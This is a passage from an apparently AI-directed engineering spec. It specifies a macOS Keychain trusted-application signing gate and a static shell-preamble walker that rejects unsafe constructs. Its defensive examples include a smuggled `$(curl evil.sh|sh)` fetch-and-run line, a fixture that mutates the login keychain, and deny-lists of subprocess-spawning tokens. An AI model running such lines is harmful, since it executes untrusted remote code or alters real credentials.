CLASSIFICATION IS APPLIED ONCE, TO THE OUTERMOST DELIVERY CONSTRUCT: text this rule classifies INERT is NOT re-scanned, so here-document syntax appearing INSIDE an inert quoted body is FIXTURE TEXT, not a construct. THE FIXTURE RULE, THE FIXTURE ANCHORING RULE, THE STATIC-ASSERTION FIXTURE RULE, SELF-MATCH IS NOT A VIOLATION and every fixture in THE FIXTURE SET FOR THIS TASK are therefore UNAFFECTED for precisely the reason v14 gave and this correction preserves: each fixture is delivered by a QUOTED here-document whose receiving command word is `cat`, and (n2)'s null construct `cat > "$dir/captured.txt" <<'EOF'` is quoted, so it stays INERT and (n1)/(n2) still differ in the one way v14 requires. AND (F-5)'s RECEIVING COMMAND WORD IS PINNED HERE, because an unpinned required fixture is what made this criterion ungradable: (F-5) `unquoted-heredoc-smuggle` is DELIVERED like every other fixture, by `cat > "$dir/fixture-unquoted-heredoc.sh" <<'EOF'` into `$(mktemp -d)` -- quoted body, `cat` receiver, so the HARNESS'S OWN SOURCE carrying it stays inert -- and THE FIXTURE FILE THUS WRITTEN contains the construct `cat > "$dir/inner.sh" <<EOF`, then a line invoking `security` with a mutating subcommand against the login keychain, then `EOF`: a NON-PASSTHROUGH receiver and an UNQUOTED body. The harness MUST FAIL that fixture file by (p3) under clause (a), printing the null text (F-5) already owes and exiting 1; that verdict is NOT in the discretion of the target test. ONE REQUIRED FIXTURE, ONE MANDATED OUTCOME.

THE CONSTRUCT WALK, new in v6 and pinned with the same rigour criterion 1 gives its tokenisation (round-5 finding S1s, CONFIRMED). v5 said only that the harness `walks the resulting constructs in file order`, and criterion 1 step (2) — the routine it borrows — defines joining and comment-stripping but never how several physical lines become ONE construct, because its own target is a single command line. Item (iv-b) is a multi-line block, so the boundary rule decides both whether a compliant diff passes and whether an adversarial one does. The routine, in order: (1) READ the source as text. (2) NORMALISE: join backslash-continued lines exactly as criterion 1 step (2) joins them, keeping for each logical line the 1-based PHYSICAL line number it starts at. (3) STRIP: remove comments as criterion 1 step (2) removes them (a `#` beginning a word outside quotes starts a comment, to end of logical line) and drop whitespace-only logical lines; the line-number map survives the strip, so every message pinned below reports a physical line number. (4) GROUP: maintain a depth counter starting at 0. A logical line whose first word is `if` or `case` opens a block and increments depth; every later `if`/`case` in COMMAND POSITION (first word of a logical line, or first word after an unquoted `;`, `then`, `else`, `elif`, `do`, `&&`, `||` or `|`) increments it; each `fi`/`esac` in command position decrements it. A CONSTRUCT spans from a logical line beginning at depth 0 to the logical line at which depth returns to 0; a depth-0 logical line that opens nothing is a construct of one line. If the file ends at depth greater than 0, the walk FAILS with `unbalanced block opened at line N: the preamble walk cannot determine construct boundaries` and exits 1. It never guesses a boundary. (5) REFUSE THE UNCLASSIFIABLE, before classifying anything: any construct beginning before the guard that is not exactly one of (i)-(v) under the tests in step (6) is a FAILURE — including one the walker merely does not recognise. There is no `probably fine` branch. This inversion is what closes S1s's second failure mode: a `$(curl ...)` or an external command hidden inside item (iv-b)'s branches is rejected because the body test admits only the listed shapes, not because the walker went looking for a blacklist and happened to find it. (6) CLASSIFY. (iii) is a logical line whose normalised text is exactly `set -euo pipefail`. (iv-a) is a single logical line consisting of exactly one word of the form `SIGNING_IDENTITY_NAME=<SFV>`, with no command word before it and nothing after it. (v) is that same shape for `LOGIN_KEYCHAIN`. (iv-b) is a block from step (4) EVERY interior logical line of which is one of: `if <TEST>`, `then`, `elif <TEST>`, `else`, `fi`, `case <SFV> in`, a pattern line matching `<PATLINE>` (NEW IN v7, round-6 finding F2), `;;`, `esac`, or a single assignment `SIGNING_IDENTITY_NAME=<SFV>`; where `<TEST>` is a `[ ... ]`, `[[ ... ]]` or `test ...` conditional whose every operand is an `<SFV>` and which contains no `-a`/`-o`/`&&`/`||`-joined command and no `$(`.  `<PATLINE>` is a logical line consisting of an OPTIONAL leading `(`, then one or more patterns separated by `|`, then a terminating `)` and NOTHING after it except optional whitespace; and EVERY pattern in it must itself be an `<SFV>`. Before v7 this alternative read `a pattern line ending in `)`` — the sole SHAPE-ONLY alternative in a list whose every other member is bound to `<TEST>` or `<SFV>`, so `$(curl evil.sh|sh))` was a legal interior line of an item (iv-b) block: it ends in `)`. The `<SFV>` requirement is what closes that, and it closes it by the same deny-by-default test the rest of the walk uses rather than by a new blacklist. Any other interior line makes the construct NOT item (iv), and the walk fails with `preamble item (iv) rejected at line N: "<text>" is not an assignment of SIGNING_IDENTITY_NAME to a side-effect-free value` and exits 1. (7) The first construct that is not in (i)-(v) MUST be the guard AND MUST satisfy THE GUARD FORM below. On placement failure it prints `empty-identity guard is not the first executable construct: found <construct text> at line N before the guard at line M` — naming EVERY offending construct it found, not only the first — and exits 1.

THE GUARD FORM, new in v6, and it is the half of the safety gate v5 was missing (round-5 finding C1, CONFIRMED, graded S1-stop-the-line). v5's static routine established only WHERE the guard sits. A construct in the right place with an inverted condition, or with a diagnostic and no `exit`, passes a PLACEMENT check — and criterion 3 then launches the empty-name subprocess against exactly that tree. The subprocess walks past the non-refusing guard, `security find-certificate -c ""` matches nothing, the run ENTERS the creation branch and reaches `openssl req`, `openssl pkcs12 -export`, `security import ... -k "$LOGIN_KEYCHAIN"` and `security set-key-partition-list` against the operator's REAL login keychain. Placement was never the property the launch depended on; REFUSAL was, and v5 never checked it. So the walker validates the construct itself, deny-by-default. (g1) CONDITION — the guard is an `if` block whose condition is EXACTLY one of `[ -z "${SIGNING_IDENTITY_NAME:-}" ]`, `[ -z "${SIGNING_IDENTITY_NAME-}" ]`, `[[ -z "${SIGNING_IDENTITY_NAME:-}" ]]`, `[[ -z "${SIGNING_IDENTITY_NAME-}" ]]`, or `[ -z "$SIGNING_IDENTITY_NAME" ]` (this last is admissible only because `set -euo pipefail` is item (iii) above it and item (iv) has already assigned the variable). ANY other condition text fails with `empty-identity guard condition is not a recognised emptiness test: "<text>" at line N`. Polarity is never INFERRED: an inverted `-n` guard fails because it is not on the list, not because the walker reasoned about negation, and that is deliberate — a walker that reasons about negation is a walker that can be argued with. (g2) BODY — the true branch is exactly two logical lines, in this order: the diagnostic `echo "ensure-signing-identity: refusing to run set-key-partition-list with an empty identity name" >&2`, message matched character-for-character against the string this clause pins and the redirection to fd 2 required; then `exit <N>` with N an integer literal in 1-255. `return` FAILS (the file is sourced by `scripts/make-app.sh:79`, so `return` in a sourced script continues the caller). A BARE `exit` FAILS, and the reason is pinned here so nobody re-litigates it: bare `exit` exits with the status of the last command, which after a successful `echo` is 0 — a guard that prints the refusal and exits 0 is a guard that does not refuse. (g3) SHAPE — no `else`, no `elif`, nothing between the condition and the diagnostic, and no other statement inside the block. On any (g1)-(g3) failure the harness prints `empty-identity guard is present but cannot refuse: <reason> at line N`, exits 1, AND LAUNCHES NO SUBPROCESS. Under the hypothesis, placement and form both passing, it prints `ok: empty identity guard is the first executable construct and refuses` and exits 0. The guard therefore sits ABOVE the `if ! security find-certificate ...` probe that currently opens at line 23, and not merely before argv assembly at 56. WHY THIS IS SPELLED OUT TWICE INSTEAD OF REFERENCED ONCE: v4 wrote the placement here as `after the preamble and the two assignments it reads` and in criterion 3 as `the first executable statement after the SIGNING_IDENTITY_NAME assignment at line 16`. Line 17 is itself an executable statement, so the two placements differed by one line and BOTH were graded — a worker could not satisfy both literally. v5 settles it on THIS clause's side, below both assignments, and writes the identical enumeration into criterion 3. v3 said only `before argv assembly`, which is also satisfied by placing the guard inside the creation branch, and that placement makes criterion 3's own harness case unsafe: `find-certificate -c ""` matches nothing, so an empty-name run enters the branch and reaches `openssl req`, `openssl pkcs12 -export` and `security import ... -k "$LOGIN_KEYCHAIN"` before the guard ever executes. The guard exists to stop a destructive call; it must sit above everything destructive, not above one of them. Criterion 3 grades this statically, by THE CONSTRUCT WALK above — until it reaches a construct outside (i)-(v), asserting that construct is the guard, AND asserting THE GUARD FORM on it — NOT by comparing line numbers, which v5 retired because a line-number comparison passes a file with any number of statements, including a `source` of this very script, above the guard (spec-review-r4 finding F4 / codex C5). v6 adds the form half, because v5 graded WHERE the guard sits and never that it refuses, and criterion 3 launches a real subprocess on the strength of that grade (round-5 finding C1). The script runs under `set -euo pipefail`; the guard must still be explicit, because an empty-but-set variable does not trip `-u`.

CORRECTED IN v14 (round-19 finding R3, graded S3-minor): THIS CLAUSE MIXES TWO UNITS AND ITS INSTRUMENT MEASURES ONLY ONE. `may be run in EXACTLY TWO PLACES` is a count of SOURCE SITES; `a harness that runs the probe a THIRD time does not` is a count of EXECUTIONS; and the instrument named above, clause (h5) of criterion 3's HARNESS INVOCATION INVENTORY, is a STATIC matcher that counts `security` command words in executable position across the harness file set. A static matcher can count PLACES. It cannot count EXECUTIONS: one site inside a loop, a retry, or a helper called from both permitted call sites runs the probe more times than there are sites, and (h5) sees one occurrence and reports two-or-fewer. Asking it for the execution count is asking a component for a fact it has no instrument to measure (`lesson-raised-c599f971488d`), and it would not refuse -- it would report the site count and the reader would read it as an execution count. THE BOUND IS RESTATED IN THE UNIT (h5) MEASURES, and re-derived rather than renumbered: WHAT IS GRADED IS AT MOST TWO SOURCE SITES for the pinned READ-ONLY probe across the harness file set, each site being one of the two enumerated above -- criterion 5(e)'s safe-to-run decision and functional clause 7(B1)'s identity-PRESENT precondition -- and a harness that computes the answer ONCE and reuses it at both sites has ONE site and satisfies the bound, exactly as this clause already said. THE EXECUTION-COUNT HALF IS NAMED HERE AS UNMEASURED BY (h5): `a THIRD time` states a design intent -- do not re-probe needlessly -- and NO instrument in this plan grades it. It is retained as intent and MUST NOT be reported as a verified bound; a Result that cites (h5) as evidence that the probe ran at most twice is citing a site count for an execution claim, and that is the defect this correction exists to prevent. THERE IS NO REACHABLE UNSAFE PASS BEHIND THIS WORDING, AND THAT IS WHY THIS IS S3 AND NOT S2 -- stated so a later reader does not re-open it as a safety hole: (h5)(ii) pins EVERY counted occurrence's invocation vector to the READ-ONLY probe pinned above, so an extra EXECUTION is an extra run of an already-pinned read-only command, which mutates nothing; nonfunctional clause 1's prohibition on MUTATING subcommands is untouched and absolute, as is the total prohibition on `openssl`. The wording promised a measurement (h5) does not make; it did not permit an unsafe command. ONE CONSEQUENCE OF v14's OTHER REPAIR, noted so the two are read together: under the POSITION rule as widened by round-19 finding R1 in `tasks[0].acceptance_criteria[2]`, `executable position` now includes text delivered to an interpreter by redirection or pipe, so (h5)'s site count is taken over a STRICTLY WIDER set of positions than in v13 -- a `security` word inside a here-document delivered to `bash` is now a counted site rather than inert data. That makes this place bound tighter, not looser, and no site permitted above stops being permitted.

`--timestamp` failure must be fatal, never swallowed. No `|| true`, no `--timestamp=none` fallback in the default path. An untimestamped signature that silently replaced a timestamped one is the class of defect where one stage verifies state A and the next ships state B. AMENDED IN v9 (round-9 finding CODEX-F4): `fatal` is stated here as a SHAPE, not left to a criterion's grep, so that clause and criterion cannot disagree about the same line. A `||`-joined handler on the signing line is PERMITTED if and only if its command list ends in an unconditional nonzero exit — `codesign ... --timestamp "$APP" || { echo "timestamped signing failed" >&2; exit 1; }` is COMPLIANT and criterion 9's static half must pass it. `|| true`, `|| :`, `|| exit 0`, a handler that logs without exiting, and a handler that re-signs without `--timestamp` are all forbidden. Criterion 9's STATIC HALF grades this clause; before v9 the criterion rejected the compliant shape this sentence now names.

Signing changes must not alter the bundle identifier, the certificate, or anything else the designated requirement is computed from — a changed DR silently voids every existing Keychain 'Always Allow' grant, which is the precise bug the self-signed-identity machinery exists to prevent.

The gate is not inverted, and this is the criterion that catches a gate which rejects everything. A test with a verifier that APPROVES both supplied paths asserts the write proceeds (`update` called once, return `true`), at both sites. Under the null of an over-eager gate the test reports `Expectation failed: (ok -> false) == (true -> true)` and the app would ship an ACL that trusts nobody. THIS CRITERION IS EXEMPT FROM THE INJECTED-`onReject` RULE, stated here in its own text as of v5 the same way criterion 5 states the exemption for its twelve empty-list sites (spec-review-r4 finding F6). Its verifier APPROVES both supplied paths, so no rejection occurs, so nothing is appended to `AppPaths().root/trusted-application-gate.log` and there is nothing for a recorder to record. You MAY pass an explicit `onReject` recorder anyway, and if you do, assert it captured ZERO lines — which turns the exemption into a second, cheap proof that the approve-both path rejects nothing. What you may NOT do is read the HARD CONSTRAINT of nonfunctional clause 9 and criterion 8 as failing this criterion for omitting one: as of v5 that constraint triggers on a REJECTION, not on a non-empty list, and criterion 3 rejects nothing.

Per-path filtering, not all-or-nothing. A test supplies two paths, approves the first and rejects the second, and asserts the write proceeds with a trusted list containing ONLY the approved path. Under the null of an all-or-nothing gate the write is refused entirely and the app's own bundle — which IS signed when it is the packaged `.app` — loses the trust it needs, reintroducing the Keychain re-prompt documented at the target repo's `CLAUDE.md` lines 83-94. This is the semantics the plan settles: filter per path; refuse the whole write only when the input was non-empty and every path was rejected. (For what happens when the app's own bundle is the rejected one — the unsigned dev-run case — see criterion 7, which is where that behaviour is settled.) v4: the second path here is REJECTED, so this test too MUST pass an explicit `onReject` recorder rather than letting the default apply (nonfunctional clause 9). Assert the recorder captured EXACTLY ONE line, naming the rejected path and not the approved one — which is free to check here and doubles as evidence that the filter is per-path on the diagnostic side as well as on the ACL side.

THE POLICY CRITERION, and it is differential against the two wrong verifiers specifically. v1's version of this criterion probed only Apple-signed `/bin/ls` (approved) and a chmod-0755 temp file (rejected) — both of which are also satisfied by (A) a bare `SecStaticCodeCheckValidity(code, [], nil)`, which ACCEPTS ad-hoc signatures, so `codesign -s - malicious` reopens SEC-1 with one trivial extra step, and by (B) an anchor-or-team-requiring check, which REJECTS this repo's own self-signed bundle and breaks self-heal for every build it produces. The plan pins the middle policy as a literal: the gate compiles the requirement string `anchor exists` with `SecRequirementCreateWithString` and passes it to `SecStaticCodeCheckValidity`. `anchor exists` is true for any code carrying a certificate chain and false for ad-hoc code, which has none, and it does NOT demand the chain reach Apple. WHICH VERIFIER THESE PROBES EXERCISE, pinned in v7 (round-6 finding F7): `the DEFAULT verifier` below means the member `TrustedApplicationGate.defaultVerify` BY NAME — the exact member criterion 8 probe (g) proves is the default of both `performWrite` and `performRepairWrite` — and not a locally-constructed verifier that happens to use the same requirement string. That naming is what joins this criterion's behavioural grading to the value production actually runs: (g) proves the sinks bind that member, these probes prove that member refuses ad-hoc code. Four probes, each with distinct texts: (a) STRUCTURAL — a test asserts the gate's requirement string is exactly `anchor exists`; under null A it is `nil`/absent and the test reports `Expectation failed: (requirementString -> nil) == ("anchor exists" -> "anchor exists")`, under null B it reports the same failure naming `anchor apple` or the team constraint the implementer wrote instead. (b) AD-HOC REJECTED, behavioural and machine-independent — the test copies a Mach-O it already has (the test process's own executable is fine) into `FileManager.default.temporaryDirectory`, runs `codesign --force --sign - <copy>` via `Process` FROM THE TEST (note: `codesign --sign -` is ad-hoc, uses no identity and touches no keychain, so it is permitted; `/usr/bin/security` is not), records `codesign -dv` on the result verbatim to prove it really is ad-hoc, and asserts the DEFAULT verifier REJECTS it. Under null A it is approved and the test reports `Expectation failed: (approved -> true) == (false -> false)` — this is the probe A cannot survive. (c) SELF-SIGNED ACCEPTED, behavioural — with the local identity present, the test signs another copy with `codesign --force --sign "ClaudeStatusBar Local Signing"` and asserts the DEFAULT verifier APPROVES it. Under null B it is rejected and the test reports `Expectation failed: (approved -> false) == (true -> true)` — this is the probe B cannot survive. PRESENCE IS DECIDED BY EXACTLY ONE COMMAND, pinned by this plan: `security find-certificate -c "ClaudeStatusBar Local Signing" "$HOME/Library/Keychains/login.keychain-db"`, exit 0 meaning PRESENT. Do NOT decide it with `security find-identity -v -p codesigning`: `scripts/ensure-signing-identity.sh:19-23` in this same repo documents that find-identity filters by TRUST VALIDITY, which a self-signed leaf certificate never satisfies (no trusted anchor) even once codesign is already using it successfully — which is why line 23 of that script uses find-certificate instead. A find-identity probe would report the identity ABSENT on the very machine where this criterion declares it PRESENT, turning a correct gate into a skip, and a skip here is a failure. This probe REQUIRES the identity, which CI does not have: it must be written so that its absence produces an explicit `withKnownIssue`/skip that PRINTS `probe-c skipped: signing identity absent` rather than passing silently, and the Result must record whether it RAN, with its verbatim output. On this machine the identity is PRESENT (measured 2026-09-07), so it must run here and a skip here is a failure of this criterion. (d) SANITY — Apple-signed `/bin/ls` approved, and a chmod-0755 non-code temp file rejected, as in v1. If probe (b) or (c) contradicts the plan's premise about what `anchor exists` means, STOP and return `spec-change-proposed` quoting the measurement; do not weaken the requirement string to make a test pass.

Nonfunctional clause 3 requires the default verifier be SYNCHRONOUS and `must not spawn a subprocess`, and spends a paragraph on why: `performWrite` and `performRepairWrite` are synchronous and are called from synchronous contexts, and the repo's existing signature reader routes through a `defaultRun` whose own comment says it has NO timeout on purpose. v7 graded the SYNCHRONOUS half — criterion 9's null is the `'async' call in a function that does not support concurrency` compile error — and graded the NO-SUBPROCESS half not at all. A worker who implements `defaultVerify` by shelling out synchronously to `/usr/bin/codesign --verify -R="anchor exists"` compiles clean, passes probes (a) through (d) (the requirement string is still exposed, ad-hoc is still rejected, self-signed is still accepted), and ships a credential path that blocks on an unbounded subprocess on every launch, wake and unlock. THE PROBE, textual, and scoped to `Sources/` ONLY because this same clause explicitly permits the TESTS to shell out to `/usr/bin/codesign` to manufacture their specimens: a test reads `Sources/StatusBarCore/Accounts/TrustedApplicationGate.swift`, strips comments and dead code and normalises whitespace by the procedure criterion 8 pins, and asserts the normalised text contains NONE of `Process(`, `NSTask`, `posix_spawn`, `/usr/bin/codesign`, `/usr/bin/security` or `system(`. Under the null it reports `Expectation failed: TrustedApplicationGate.swift references "Process(", expected none: nonfunctional clause 3 forbids the shipped verifier to spawn a subprocess, because the sinks are synchronous and the repo's only subprocess runner has no timeout`. HYPOTHESIS: silence. The probe is a deny-by-default token list rather than an analysis of what the file does, for the same reason THE CONSTRUCT WALK is: a check that reasons about whether a spawn looks harmless is a check that can be argued with. A verifier that genuinely needs one of these tokens is a `spec-change-proposed` quoting the Security-framework call it could not make synchronously.

PROBE (e) IS CORRECTED IN v9 (round-9 finding CODEX-F5, graded S3-minor: the token blacklist MISSES ORDINARY API SPELLINGS). v8 asserted the normalised text of `TrustedApplicationGate.swift` contains none of `Process(`, `NSTask`, `posix_spawn`, `/usr/bin/codesign`, `/usr/bin/security` or `system(`. A coder who writes `Process.init()` and builds the tool URL as `URL(fileURLWithPath: "/usr/bin").appendingPathComponent("codesign")` matches NONE of those substrings, passes probes (a) through (d), and ships a credential path that blocks the synchronous sink on an unbounded subprocess on every launch, wake and unlock. That is not obfuscation; it is how the API is ordinarily spelled. FOUR CORRECTIONS. (e-1) MATCH `Process` AS AN IDENTIFIER, not as a constructor: after the pinned procedure including STEP (2b), the probe fails on any word-boundary occurrence of the identifiers `Process`, `NSTask`, `posix_spawn`, `system`, `popen`, `fork`, `execv`, `execve`, `execvp`, `NSWorkspace`, or `DispatchQueue.global` used to wrap a spawn — independently of following punctuation or whitespace, so `Process (`, `Process.init()`, `Process\n    ()` and a typealias to it all fail. (e-2) MATCH ASSEMBLED SYSTEM PATHS: the probe fails on any string literal in the file that is an absolute path whose first component is `usr`, `bin`, `sbin` or `Applications`, and on any `appendingPathComponent` or `appending(path:)` chain whose root is such a literal — which is what catches the component-built URL. (e-3) MAKE THE SINGLE-FILE SCAN SOUND, which is the half CODEX-F5 named that a bigger token list cannot fix, AND MAKE THE CLOSURE TRANSITIVE, which is the half v9 through v11 got wrong (round-15 findings R15-task2-F1 and ORCH-R15-1, S2-major/correctness). v9 asserted only that the repo-declared symbols referenced in `defaultVerify`'s OWN BODY are a SUBSET of the symbols declared in `TrustedApplicationGate.swift`, which is ONE HOP, while the property nonfunctional clause 3 states is everything `defaultVerify` REACHES: a helper declared IN THIS FILE that itself calls a spawning helper declared in another file PASSES v9's assertion and VIOLATES the clause, and the file-wide token list cannot see it, because the token it sees in the in-file helper is a call to an out-of-file symbol and that is not a spawn token. THE PROBE AS OF v12, and v9's one-hop wording is SUPERSEDED, NOT ADDITIONAL: start a worklist at `defaultVerify`; for the member at its head, collect every REPO-DECLARED symbol referenced anywhere in that member's body; for each such symbol, if it is NOT declared in `TrustedApplicationGate.swift` the probe FAILS, and if it IS declared in `TrustedApplicationGate.swift` push it onto the worklist unless it has already been visited. The walk terminates because the only members ever pushed are declared in one finite file and each is visited once, which is what keeps the check single-file and bounded. Under the null the probe FAILS with `Expectation failed: defaultVerify reaches <symbol> declared outside TrustedApplicationGate.swift via <defaultVerify -> ... -> symbol>, so this single-file probe cannot see whether it spawns a subprocess: nonfunctional clause 3 requires the shipped verifier's subprocess-freedom to be checkable in one file`. THE PATH IS PART OF THE NULL AND IS NOT OPTIONAL: at depth one it degenerates to `defaultVerify -> symbol` and costs nothing, and at greater depth it is the only thing that makes the failure readable, because the symbol alone does not name the in-file member that let it in. HYPOTHESIS: silence. That converts an unbounded call-graph question into a bounded structural one and makes the file scan complete rather than merely convenient. (e-4) DESCRIBE THE MECHANISM HONESTLY: this is a DENY-BY-DEFAULT BLACKLIST over one file plus a TRANSITIVE single-file-closure assertion, not a proof of subprocess-freedom, and (e-3) is what makes the blacklist's scope equal to the property's scope — a claim that is true only because (e-3) is transitive as of v12, and that was false under v9's one-hop condition, where a helper declared in this file could reach a spawn the blacklist never saw. EVERY FIXTURE OF THIS PROBE CARRIES A G IDENTIFIER AND A FILENAME AS OF v12 (round-15 finding R15-task2-F1, second half): before v12 only G-4 was identified here, so three of this probe's four fixtures had no identifier, no filename and no entry in criterion 8's enumerated fixture set, and criterion 8's graded count could therefore be satisfied in full by a Result that never ran any of them. POSITIVE FIXTURE it must PASS: (G+6) `defaultVerify-compliant.swift.txt` — the compliant implementation, whose only Security-framework calls are `SecStaticCodeCreateWithPath`, `SecRequirementCreateWithString` and `SecStaticCodeCheckValidity`, which names no absolute path, and every repo-declared symbol it reaches is declared in the fixture file itself, so the (e-3) closure closes. NEGATIVE FIXTURES it must FAIL, each with its null quoted: (G-4) `process-init-no-paren.swift.txt` — `Process.init()` plus a component-built `/usr/bin` URL, which (e-1) and (e-2) catch; (G-8) `process-literal-paren.swift.txt` — a literal `Process()` line, which (e-1) catches; (G-9) `defaultVerify-direct-out-of-file-helper.swift.txt` — a `defaultVerify` that calls a helper declared in another file, which (e-3) catches AT DEPTH ONE; (G-10) `defaultVerify-transitive-out-of-file-helper.swift.txt`, NEW IN v12 — a `defaultVerify` that calls a helper DECLARED IN THIS FILE which in turn calls a spawning helper declared in another file, which (e-3) catches ONLY AS A TRANSITIVE CLOSURE and which every version of this probe from v9 through v11 PASSED. (G-10) is the fixture that actually grades the v12 correction: a probe that still stops at one hop passes it, so a Result reporting (G-10) as PASS has reported the defect rather than the fix. Its null must quote the PATH, per (e-3). All four are enumerated with the rest of this task's fixture set in criterion 8, which owns the graded count. It cannot see a spawn reached through a Foundation API this list does not name, nor through a C interop shim; what (e-3) guarantees is that whatever `defaultVerify` reaches is IN THIS FILE, where the blacklist can see it. A verifier that genuinely needs one of these tokens, or a helper in another file, is a `spec-change-proposed` quoting the Security-framework call it could not make synchronously.

DEV-RUN BEHAVIOUR, settled here rather than discovered in production. `Sources/StatusBarCore/Accounts/AccountVaultSelfHeal.swift:31` supplies `trustedPaths: () -> [String] = { [Bundle.main.bundlePath] }` — verified by reading the file. Under `swift run`, `swift test`, or any unbundled debug binary, `Bundle.main.bundlePath` is the bare `.build/debug` directory, which carries no code signature, so the gate rejects it, the input list is non-empty, every member is rejected, and criterion 4's settled semantics REFUSE the write. THIS PLAN ACCEPTS THAT, and requires it be explicit and fail-safe rather than silent: a test supplies a single path that is an unsigned directory the test creates (standing in for `.build/debug`), and asserts `performRepairWrite` returns `false`, calls `update` ZERO times, calls `add` ZERO times, and emits a diagnostic naming the path and the reason through the channel criterion 8 pins — in THIS test, via the injected recorder of criterion 8 probe (d), never via the production default, which writes outside the worktree. Zero calls is the load-bearing part: the existing Keychain item and its existing ACL are left EXACTLY as they were, so a dev run declines to repair but never downgrades. Under the null of an implementation that 'falls back to the system default ACL' when everything is rejected, `update` is called once with an empty trusted list and the test reports `Expectation failed: (updateCalls -> 1) == (0 -> 0)` — that implementation would silently strip the app's own grant on every dev launch. EXECUTABLE REFERENCE vs INERT MATCH DATA — pinned ONCE here, used by every textual probe in this task. THE PINNED SOURCE-TEXT MATCH PROCEDURE above gains a STEP (2b), inserted between the comment-and-dead-code strip and the whitespace normalisation, and every probe that cites the procedure gets it: (2b) STRIP SWIFT STRING LITERALS — delete every `\"\"\"...\"\"\"` multi-line literal, then every `\"...\"` single-line literal, honouring `\\\"` escapes, and delete every `#\"...\"#` raw literal, replacing each with a single space. A token occurrence surviving step (2b) is an EXECUTABLE REFERENCE; a token occurrence that step (2b) deleted is INERT MATCH DATA — a search needle, an expected-substring constant, a diagnostic message, a fixture path — and fails no probe in this task. This is the distinction v8 did not draw, and it is why probe (h) as v8 wrote it rejects the very tests probe (b) requires. NOTE, so the permission does not become the evasion: a probe must also assert that the literals it deleted were not EXECUTED — specifically, that no `\"/usr/bin/...\"`-shaped literal it deleted from `Sources/` was passed to a URL or Process API, which criterion 6 probe (e) grades directly, and that no deleted literal under `Tests/` is used as the receiver of a call. functional_clauses: New file `Sources/StatusBarCore/Accounts/TrustedApplicationGate.swift` holding one gate used by both sites. Follow the repo's established injection idiom — a default-parameter closure for the verifier, exactly as `resolvedClaudePath(candidates:isExecutable:)` and `performWrite(...update:add:)` already do — so the tests can drive it without touching the real Security framework.

Call the gate from INSIDE `performWrite` and `performRepairWrite`, at the point the path list is about to become `[SecTrustedApplication]` — not from `LiveCredentialSelfHeal`'s or `AccountVaultSelfHeal`'s `trustedPaths` closures. A gate at the producer protects today's two callers; a gate at the sink protects the caller nobody has written yet.

Semantics, settled by this plan and not to be re-litigated in the diff: filter per path. Approved paths become `SecTrustedApplication`s as today. Rejected paths are dropped and diagnosed. If the input list was non-empty and the filtered list is empty, REFUSE the write — return `false` without calling `update` or `add`, leaving the existing Keychain item and its existing ACL untouched. If the input list was empty, behave exactly as today (the caller asked for the system-default ACL).

THE VERIFICATION POLICY, pinned as a literal so it is checkable: build the gate on `SecStaticCodeCreateWithPath` plus `SecStaticCodeCheckValidity(staticCode, flags, requirement)` where `requirement` is `SecRequirementCreateWithString` over the exact string `anchor exists`, and expose that string so a test can assert it (criterion 6a). Rationale, and the reason a bare validity check is NOT acceptable: `anchor exists` is satisfied by any code with a certificate chain and unsatisfied by ad-hoc code, which carries no certificates at all. A bare `SecStaticCodeCheckValidity(code, [], nil)` accepts ad-hoc signatures, and `codesign --force --sign -` is free to anyone who can write a candidate path, so that verifier reopens SEC-1 with one extra step. In the other direction, do NOT require an Apple anchor (`anchor apple`), do NOT require a trusted anchor, and do NOT require a Team Identifier: measured on the shipped artifact 2026-09-07, this app's own bundle is signed by the self-signed local certificate `ClaudeStatusBar Local Signing` with `TeamIdentifier=not set`, so any of those would reject the app's own bundle and break self-heal for every build this repo produces. Choose the `SecCSFlags` for full/strict validation and record which you chose and why.

Preserve every existing public signature's shape, arity and async-ness: every parameter this task adds is ADDITIVE with a default, so no existing call site changes. This task adds exactly TWO such parameters to each sink (`performWrite`, `performRepairWrite`) and no others: (1) the verifier, `verify: (String) -> Bool = TrustedApplicationGate.defaultVerify`, following clause 1's injection idiom AND PINNED AS TEXT BY CRITERION 8 PROBE (g) AT BOTH SINKS (NEW IN v7, round-6 finding F7: until v7 this clause was the only place in the plan where that binding appeared, and no criterion asserted it — every criterion that exercises a sink injects its own verifier by design, so the shipped default was the one thing none of them observed); and (2) the rejection sink, `onReject: (String, String) -> Void = TrustedApplicationGate.defaultOnReject`, path first, reason second. v2 permitted exactly one additive parameter while also demanding a production diagnostic, which no permitted edit could deliver — a criterion nothing could satisfy. This clause settles it by permitting the second parameter and pinning its default; clause 6 pins what that default does.

THE DIAGNOSTIC CHANNEL, pinned by this plan because the production call chain runs through files this task may not edit, and pinning it is what makes criterion 8 satisfiable without widening the edit surface. The chains are: `AccountVaultSelfHeal.run` (forbidden) -> its `write:` closure `(Data, String, [String]) -> Bool` (forbidden, and carrying no log URL) -> `AccountCredentialVault.repairWrite` -> `defaultRepairWriter` -> `performRepairWrite`; and `LiveCredentialSelfHeal.run` (forbidden) -> `LiveCredentialWriter.write` -> `performWrite`. Every link AFTER the forbidden file is inside this task's claims, so a default argument declared at the sink IS the shipped behaviour — no edit to a forbidden file is needed and none is permitted. `TrustedApplicationGate.swift` therefore declares FOUR public members (v3 declared three; v4 adds member iii): (i) `defaultDiagnosticLogURL: URL`, equal to `AppPaths().root.appendingPathComponent("trusted-application-gate.log")` — precedent `NativeAccountSwitcher.swift:26`, which defaults its own `native-switch.log` URL in-file the same way, so this follows the repo's idiom rather than inventing a channel; (ii) `writeRejectionDiagnostic(path:reason:to:)`, which creates the destination's parent directory if it is missing and APPENDS one line — timestamp, the rejected path, the reason — following the `FileHandle(forWritingTo:)`-else-`data.write(to:)` idiom of `AccountVaultSelfHeal.writeDiagnostic` (:67) and `NativeAccountSwitcher.swift:173`, and which must be best-effort throughout (`try?`, never throwing, never trapping, never blocking the credential path: a failed log must not fail a write); (iii) NEW IN v4 — `rejectionHandler(writingTo url: URL) -> (String, String) -> Void`, a factory returning `{ path, reason in writeRejectionDiagnostic(path: path, reason: reason, to: url) }`. Its whole purpose is that the COMPOSITION of handler and writer can be exercised against a temporary URL instead of the operator's home, which is what criterion 8 probe (e) does; v3 mandated the composition but no probe could grade it, because invoking the default was — correctly — forbidden; and (iv) `defaultOnReject: (String, String) -> Void`, equal EXACTLY to `rejectionHandler(writingTo: defaultDiagnosticLogURL)`. That spelling is pinned rather than stylistic, because criterion 8 probe (f) matches it as text. Do NOT make `defaultDiagnosticLogURL` settable and do NOT add an environment redirect for it: the factory is the only redirection seam this plan permits, and it is one production never uses. The line carries the rejected path and the reason and NOTHING else — no credential bytes, no Keychain contents, no data being written (nonfunctional clause 7 governs). If you conclude this channel cannot be built inside these claims, STOP and return 